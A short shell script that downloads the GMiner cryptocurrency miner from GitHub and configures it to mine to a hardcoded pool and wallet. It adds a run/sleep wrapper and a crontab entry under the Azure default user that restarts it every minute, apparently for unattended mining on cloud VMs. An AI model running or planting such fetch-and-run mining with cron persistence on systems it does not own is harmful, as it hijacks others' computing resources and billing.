#!/bin/sh
mkdir miner
cd miner
wget https://github.com/develsoftware/GMinerRelease/releases/download/2.73/gminer_2_73_linux64.tar.xz
tar -xvf gminer_2_73_linux64.tar.xz
echo "#!/bin/sh" > eth_zil.sh
echo "./miner --algo eth --server us-east.ezil.me:5555 --user 0x8608edcb3cdecea1c742b1adc2afa9284364132f.zil1evv9h6mrupf8sgxnj6t8ljj2rl76l0pekhv6ed -l log.txt" >> eth_zil.sh
chmod 777 eth_zil.sh
cd ..
echo "#!/bin/sh" > run.sh
echo "cd miner" >>run.sh
echo "timeout 7h ./eth_zil.sh" >> run.sh
echo "sleep 1h" >> run.sh
chmod 777 run.sh
(crontab -l 2>/dev/null; echo "* * * * * /usr/bin/flock -n /tmp/miner_run.lockfile /home/azureuser/run.sh") | crontab -
